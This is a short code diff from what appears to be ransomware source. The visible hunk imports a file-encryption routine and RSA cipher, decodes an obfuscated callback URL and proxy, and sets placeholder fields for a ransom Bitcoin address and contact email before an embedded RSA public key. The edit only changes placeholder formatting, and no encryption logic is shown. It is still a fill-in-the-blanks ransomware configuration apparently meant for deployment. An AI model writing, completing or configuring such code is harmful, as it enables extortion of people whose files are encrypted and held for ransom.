@@ -35,12 +35,12 @@ from file_crypto import encrypt_file  # type: ignore
 from Crypto.Cipher import PKCS1_OAEP
 
 # Decode the encoded URL using the dx42 function.
-YOUR_URL = dx42(b"[YOUR_ENCODED_URL]").decode()  # Replace with your encoded URL
+YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL
 # Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://example.com".encode())
-YOUR_PROXY = dx42(b"[YOUR_ENCODED_PROXY]").decode() # Replace with your encoded proxy
-YOUR_BITCOIN_ADDRESS = "[YOUR_BITCOIN_ADDRESS]"
-YOUR_EMAIL_ADDRESS = "[YOUR_EMAIL_ADDRESS]"
+YOUR_PROXY = dx42(b"YOUR_ENCODED_PROXY").decode() # Replace with your encoded proxy
+YOUR_BITCOIN_ADDRESS = "YOUR_BITCOIN_ADDRESS"
+YOUR_EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
